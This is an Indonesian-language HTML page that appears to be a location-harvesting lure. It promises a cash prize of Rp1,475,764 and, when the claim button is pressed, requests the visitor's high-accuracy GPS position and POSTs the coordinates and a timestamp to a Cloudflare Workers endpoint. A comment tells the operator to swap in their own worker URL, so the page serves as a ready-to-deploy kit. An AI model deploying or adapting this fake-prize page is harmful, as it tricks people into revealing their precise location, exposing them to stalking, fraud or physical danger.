<!doctype html>
<html lang="id">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />

    <title>Klaim Hadiah Rp1.475.764</title>

    <style>
      * {
        box-sizing: border-box;
      }

      body {
        margin: 0;
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        font-family: Arial, sans-serif;
        background: linear-gradient(135deg, #ff4fa3, #ff8ac7);
      }

      .card {
        width: min(92%, 430px);
        padding: 30px 24px;
        background: #fff;
        border-radius: 24px;
        text-align: center;
        box-shadow: 0 18px 50px #a50055aa;
      }

      .badge {
        display: inline-block;
        padding: 8px 15px;
        border-radius: 999px;
        background: #ffe0ef;
        color: #d6006d;
        font-weight: bold;
      }

      h1 {
        color: #d6006d;
        font-size: 30px;
        margin: 18px 0 8px;
      }

      .money {
        font-size: 36px;
        font-weight: 800;
        color: #ff2f91;
        margin: 15px 0;
      }

      p {
        color: #666;
        line-height: 1.5;
      }

      .notice {
        background: #fff4fa;
        border: 1px solid #ffc2df;
        border-radius: 14px;
        padding: 13px;
        text-align: left;
        font-size: 13px;
      }

      button {
        width: 100%;
        border: 0;
        border-radius: 14px;
        padding: 16px;
        margin-top: 18px;
        background: #ff2f91;
        color: #fff;
        font-size: 17px;
        font-weight: bold;
        cursor: pointer;
      }

      button:disabled {
        opacity: 0.6;
        cursor: not-allowed;
      }

      .status {
        margin-top: 15px;
        font-size: 14px;
        color: #666;
        line-height: 1.5;
      }

      .success {
        color: #159447;
        font-weight: bold;
      }

      .error {
        color: #c62828;
        font-weight: bold;
      }

      .map {
        display: none;
        margin-top: 12px;
        color: #d6006d;
        font-weight: bold;
        text-decoration: none;
      }
    </style>
  </head>

  <body>
    <div class="card">
      <span class="badge">🎁 PROGRAM HADIAH</span>

      <h1>Klaim Hadiah</h1>

      <div class="money">Rp1.475.764</div>

      <p>Tekan tombol untuk melanjutkan proses klaim.</p>

      <div class="notice">
        <b>📍 Persetujuan lokasi</b><br /><br />

        Untuk melanjutkan proses klaim, browser akan meminta izin lokasi Anda.
        Jika Anda menyetujui, lokasi akan dikirim ke sistem klaim untuk
        diproses.
      </div>

      <button id="claim">📍 Klaim Sekarang</button>

      <div id="status" class="status"></div>

      <a id="map" class="map" target="_blank" rel="noopener noreferrer">
        🗺️ Lihat di Google Maps
      </a>
    </div>

    <script>
      const btn = document.getElementById("claim");
      const status = document.getElementById("status");
      const map = document.getElementById("map");

      /*
    ==================================================
    GANTI URL DI BAWAH DENGAN URL CLOUDFLARE WORKER
    ==================================================
  */

      const WORKER_URL = "https://calm-brook-2990.legends616616.workers.dev";

      btn.addEventListener("click", () => {
        if (!window.isSecureContext) {
          status.className = "status error";

          status.textContent = "Lokasi membutuhkan koneksi HTTPS.";

          return;
        }

        if (!navigator.geolocation) {
          status.className = "status error";

          status.textContent = "Browser tidak mendukung fitur lokasi.";

          return;
        }

        btn.disabled = true;

        status.className = "status";

        status.textContent = "Meminta izin lokasi...";

        navigator.geolocation.getCurrentPosition(
          async (position) => {
            const lat = position.coords.latitude;

            const lon = position.coords.longitude;

            const acc = Math.round(position.coords.accuracy);

            const waktu = new Date().toISOString();

            const mapsUrl = "https://www.google.com/maps?q=" + lat + "," + lon;

            map.href = mapsUrl;

            map.style.display = "inline-block";

            status.className = "status";

            status.textContent = "Lokasi berhasil diperoleh. Mengirim data...";

            try {
              const response = await fetch(WORKER_URL, {
                method: "POST",

                headers: {
                  "Content-Type": "application/json",
                },

                body: JSON.stringify({
                  latitude: lat,

                  longitude: lon,

                  accuracy: acc,

                  timestamp: waktu,
                }),
              });

              const result = await response.json();

              if (!response.ok || !result.ok) {
                throw new Error("Worker gagal menerima data.");
              }

              status.className = "status success";

              status.textContent =
                "✅ Lokasi berhasil dikirim. " +
                "Akurasi sekitar " +
                acc +
                " meter.";
            } catch (error) {
              console.error(error);

              status.className = "status error";

              status.textContent =
                "Lokasi berhasil diperoleh, " + "tetapi gagal mengirim data.";
            }

            btn.disabled = false;
          },

          (error) => {
            btn.disabled = false;

            status.className = "status error";

            if (error.code === 1) {
              status.textContent =
                "Izin lokasi ditolak. " + "Silakan izinkan lokasi di browser.";
            } else if (error.code === 2) {
              status.textContent =
                "Lokasi tidak tersedia. " + "Aktifkan GPS/Lokasi.";
            } else if (error.code === 3) {
              status.textContent =
                "Pengambilan lokasi terlalu lama. " + "Silakan coba lagi.";
            } else {
              status.textContent = "Gagal mendapatkan lokasi.";
            }
          },

          {
            enableHighAccuracy: true,

            timeout: 30000,

            maximumAge: 0,
          },
        );
      });
    </script>
  </body>
</html>
